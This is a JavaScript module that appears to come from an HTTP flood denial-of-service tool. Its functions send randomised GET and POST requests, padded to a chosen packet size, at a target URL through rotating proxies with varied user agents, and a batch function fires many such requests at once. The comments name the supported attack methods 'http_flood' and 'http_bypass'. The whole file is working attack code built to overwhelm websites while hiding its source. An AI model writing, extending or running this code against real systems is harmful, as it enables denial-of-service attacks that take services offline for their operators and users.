import { createMimicHttpClient } from "./clientUtils.js";
import { randomBoolean, randomString } from "./randomUtils.js";

/**
 * Send a single HTTP request based on attack method
 * @param {Object} params - Request parameters
 * @param {string} params.target - Target URL
 * @param {string} params.method - Attack method (http_flood, http_bypass, etc.)
 * @param {number} params.packetSize - Packet size in KB
 * @param {Object} params.proxy - Proxy configuration
 * @param {string} params.userAgent - User agent string
 * @returns {Promise<{success: boolean, message: string}>}
 */
export async function sendSingleRequest({ target, method, packetSize, proxy, userAgent }) {
  const fixedTarget = target.startsWith("http") ? target : `https://${target}`;

  try {
    const client = createMimicHttpClient(proxy, userAgent);

    // For http_flood method (others can be added later)
    if (method === 'http_flood' || method === 'http_bypass') {
      const isGet = packetSize > 64 ? false : randomBoolean();
      const payload = randomString(packetSize);

      if (isGet) {
        await client.get(`${fixedTarget}/${payload}`);
      } else {
        await client.post(fixedTarget, payload);
      }

      return {
        success: true,
        message: `Request sent from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`
      };
    }

    // For other methods, use simple GET request
    await client.get(fixedTarget);
    return {
      success: true,
      message: `Request sent from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`
    };

  } catch (error) {
    return {
      success: false,
      message: `Request failed from ${proxy.protocol}://${proxy.host}:${proxy.port}: ${error.message}`
    };
  }
}

/**
 * Send multiple requests in batch
 * @param {Object} params - Request parameters
 * @param {string} params.target - Target URL
 * @param {string} params.method - Attack method
 * @param {number} params.packetSize - Packet size in KB
 * @param {number} params.count - Number of requests to send
 * @param {Array} params.proxies - Array of proxy configurations
 * @param {Array} params.userAgents - Array of user agent strings
 * @returns {Promise<{successful: number, failed: number}>}
 */
export async function sendBatchRequests({ target, method, packetSize, count, proxies, userAgents }) {
  let successful = 0;
  let failed = 0;

  const promises = [];

  for (let i = 0; i < count; i++) {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    const promise = sendSingleRequest({ target, method, packetSize, proxy, userAgent })
      .then(result => {
        if (result.success) successful++;
        else failed++;
      });

    promises.push(promise);
  }

  await Promise.all(promises);

  return { successful, failed };
}
